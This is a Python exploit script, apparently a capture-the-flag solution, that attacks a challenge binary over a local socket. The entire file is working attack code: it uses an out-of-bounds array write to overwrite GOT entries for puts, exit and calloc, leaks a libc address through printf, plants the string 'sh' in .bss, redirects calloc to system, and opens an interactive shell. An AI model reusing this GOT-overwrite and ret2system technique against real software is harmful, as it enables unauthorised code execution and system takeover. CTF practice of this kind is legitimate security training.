from ptrlib import *

elf = ELF("../distfiles/chall")

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("../distfiles/chall")
libc = ELF("../distfiles/libc.so.6")
sock = Socket("localhost", 9004)

addr_sh = elf.section('.bss') + 0x100
addr_main = elf.symbol('main')
addr_skip = 0x4007a8
rop_ret = 0x004005ce
rop_call_rax = 0x004005c8

"""
Step 1) Get stable write primitive
"""
# make infinite loop
sock.sendlineafter("n = ", "-1")
sock.sendlineafter("i = ", str(elf.got('puts') // 4))
sock.sendlineafter("= ", str(addr_main))

"""
Step 2) Leak libc address and prepare "sh"
"""
# skip exit and calloc
sock.sendlineafter("n = ", "-1")
sock.sendlineafter("i = ", str(elf.got('exit') // 4))
sock.sendlineafter("= ", str(rop_call_rax)) # align rsp

# overwrite calloc
sock.sendlineafter("n = ", str(addr_skip))
sock.sendlineafter("i = ", str(elf.got('calloc') // 4))
sock.sendlineafter("= ", str(elf.plt('printf')))
sock.sendlineafter("n = ", str(addr_skip))
sock.sendlineafter("i = ", str((elf.got('calloc') + 4) // 4))
sock.sendlineafter("= ", str(0))

# skip exit and call calloc
sock.sendlineafter("n = ", str(addr_skip))
sock.sendlineafter("i = ", str(elf.got('exit') // 4))
sock.sendlineafter("= ", str(rop_ret)) # skip exit

# leak libc address
sock.sendlineafter("n = ", str(elf.got('printf')))
libc_base = u64(sock.recv(6)) - libc.symbol("printf")
logger.info("libc = " + hex(libc_base))
sock.sendlineafter("i = ", str(addr_sh // 4))
sock.sendlineafter("= ", str(u32('sh\0\0')))

"""
Step 3) Call system("sh")
"""
# skip exit and calloc
sock.sendlineafter("n = ", str(elf.section('.bss') + 0x400)) # valid pointer
sock.sendlineafter("i = ", str(elf.got('exit') // 4))
sock.sendlineafter("= ", str(rop_call_rax)) # align rsp

# overwrite calloc
addr_system = libc_base + libc.symbol("system")
sock.sendlineafter("n = ", str(addr_skip))
sock.sendlineafter("i = ", str(elf.got('calloc') // 4))
sock.sendlineafter("= ", str(addr_system & 0xffffffff))
sock.sendlineafter("n = ", str(addr_skip))
sock.sendlineafter("i = ", str((elf.got('calloc') + 4) // 4))
sock.sendlineafter("= ", str(addr_system >> 32))

# skip exit and call calloc
sock.sendlineafter("n = ", str(addr_skip))
sock.sendlineafter("i = ", str(elf.got('exit') // 4))
sock.sendlineafter("= ", str(rop_ret)) # skip exit

# win!
sock.sendlineafter("n = ", str(addr_sh + 6))

sock.interactive()
